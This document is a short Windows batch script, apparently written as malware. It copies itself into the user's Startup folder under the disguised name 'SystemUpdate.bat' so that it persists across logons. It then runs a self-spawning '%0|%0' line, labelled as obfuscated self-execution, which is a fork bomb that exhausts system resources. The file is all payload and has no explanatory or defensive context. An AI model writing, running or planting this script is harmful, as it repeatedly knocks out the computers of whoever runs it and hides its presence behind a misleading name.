@echo off
setlocal enabledelayedexpansion

:: Get Startup folder path
for /f "delims=" %%a in ('powershell -C "$env:APPDATA + '\Microsoft\Windows\Start Menu\Programs\Startup\'"') do set "startup=%%a"

:: Copy itself to the Startup folder with a hidden name
set "hiddenName=SystemUpdate.bat"
copy "%~f0" "!startup!\!hiddenName!" >nul

:: Obfuscated self-execution
set "cmd=%0^|%0"
!cmd!
